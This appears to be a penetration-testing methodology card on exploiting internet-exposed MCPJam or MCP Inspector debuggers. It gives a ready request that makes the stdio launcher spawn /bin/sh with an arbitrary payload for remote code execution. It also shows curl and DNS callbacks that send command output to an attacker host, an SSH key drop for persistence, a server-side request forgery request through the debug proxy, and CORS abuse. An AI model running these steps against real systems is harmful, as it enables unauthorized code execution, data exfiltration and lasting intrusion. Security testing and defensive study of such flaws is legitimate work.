---
name: mcpjam-inspector-abuse
description: Exploiting exposed MCPJam Inspector / Anthropic MCP Inspector instances — unauthenticated STDIO launcher RCE, reflective CORS, debug-proxy SSRF
tags: [methodology, mcp, mcpjam, rce, ssrf, cors, llm, ai, inspector, cve-2025-49596]
source: Penlearn Local methodology
---

# MCPJam / MCP Inspector Abuse

> The MCP Inspector family (Anthropic's reference inspector and MCPJam's fork) is a **developer debugger** for Model Context Protocol servers. It is **never meant to face the internet**. When you find one exposed, assume unauthenticated RCE on the host process owner until proven otherwise.

## Fingerprints (how to spot one)

- A subdomain like `mcp.<target>`, `inspector.<target>`, `mcpjam.<target>`.
- HTML title contains "MCP Inspector" or "MCPJam Inspector".
- A JS bundle path like `/assets/index-*.js` and a `/health` endpoint returning `{"status":"ok"}`.
- Endpoint surface (probe these with GET first): `/api/mcp/servers`, `/api/mcp/connect`, `/api/mcp/tools/execute`, `/api/mcp/oauth/debug/proxy`, `/api/mcp/evals/run`, `/api/mcp-cli-config`.
- Response headers: `access-control-allow-credentials: true` with reflective `vary: Origin` — the dev defaults.

## Foothold #1 — Unauthenticated STDIO launcher RCE (CVE-2025-49596 class)

`POST /api/mcp/connect` accepts a `serverConfig` object. With `transport: "stdio"`, the inspector spawns whatever `command` + `args` you supply, as the user running the inspector. This is the same primitive as CVE-2025-49596 on the upstream Anthropic Inspector.

Schema (confirmed in ThirdTest, May 2026):

```json
POST /api/mcp/connect
Content-Type: application/json

{
  "serverId": "pwn",
  "serverConfig": {
    "type": "stdio",
    "command": "/bin/sh",
    "args": ["-c", "<payload>"],
    "env": {}
  }
}
```

A response that **closes the connection immediately** (no body, no status) usually means the process spawned and exited — confirm with an OOB callback:

```bash
nc -lvnp 9001 &  # on your tun0 IP
# payload arg: "curl http://10.10.X.Y:9001/$(whoami | base64 -w0)"
```

If the box has no outbound HTTP, fall back to DNS (`dig @10.10.X.Y $(whoami).attacker.tld`) or write SSH keys instead of opening a shell.

## Foothold #2 — Persistence via SSH key drop

Reverse shells get killed; SSH keys survive. Once the launcher executes commands, the cleanest persistence is:

```bash
ssh-keygen -t ed25519 -f /tmp/key/id_ed25519 -N "" -C "engagement"
PUB=$(cat /tmp/key/id_ed25519.pub)
# Payload via /api/mcp/connect:
# args: ["-c", "mkdir -p /home/USER/.ssh && echo '$PUB' >> /home/USER/.ssh/authorized_keys"]
ssh -i /tmp/key/id_ed25519 USER@TARGET
```

USER is whoever owns the inspector process — find it with `id`, `whoami`, or by reading `/proc/self/status` in your first callback.

## Foothold #3 — `/api/mcp/oauth/debug/proxy` SSRF

`POST /api/mcp/oauth/debug/proxy` accepts `{ url, method, body, headers }` and proxies the request server-side, returning **status + headers + body**. This is a full request-forgery primitive:

- Reach `127.0.0.1`-only services (internal admin panels, language-model APIs, metrics endpoints).
- Reach docker internal IPs (`172.17.0.0/16`) when the inspector runs alongside containers.
- Bypass `Origin` / IP allowlists on neighbor services that trust loopback.

```bash
curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:9090/metrics","method":"GET","headers":{}}' \
  https://mcp.target/api/mcp/oauth/debug/proxy
```

Use this when foothold #1 is patched but the inspector still runs — the SSRF often reaches an unauthenticated internal API that gives you the same effect.

## Foothold #4 — Reflective CORS + credentials

`access-control-allow-credentials: true` plus a reflected `Origin` header lets an attacker site (visited by a logged-in inspector user) act as that user with cookies attached. Less likely to land on an HTB box (no concurrent users) but document it on real engagements.

## Detection signals

| Signal | Confirms |
|--------|----------|
| `POST /api/mcp/connect` returns empty body and closes | Launcher accepted the config, command ran |
| OOB callback hits your listener within ~5s | RCE confirmed; record the username from the payload |
| `POST /api/mcp/oauth/debug/proxy` returns body of an internal URL | SSRF confirmed; map internal surface |
| New SSH login from your tun0 IP succeeds | Persistence locked in |

## Compliance mapping

- ttp_category: `cmd_injection` (for the launcher) / `ssrf` (for the proxy)
- MITRE ATT&CK: T1190 (Exploit Public-Facing App), T1059 (Command and Scripting Interpreter)
- OWASP_TOP10: A03 (Injection), A06 (Vulnerable Components), A10 (SSRF)
- CVE: CVE-2025-49596 (upstream Anthropic Inspector — MCPJam likely shares the class)

## Cross-Reference

- [[evidence-first]] — five-field template for the RCE finding
- [[ssrf-proxy-endpoints]] — general patterns for `proxy` / `debug` / `fetch` endpoints
- [[llm-attack-surface]] — when the inspector is part of a larger LLM stack
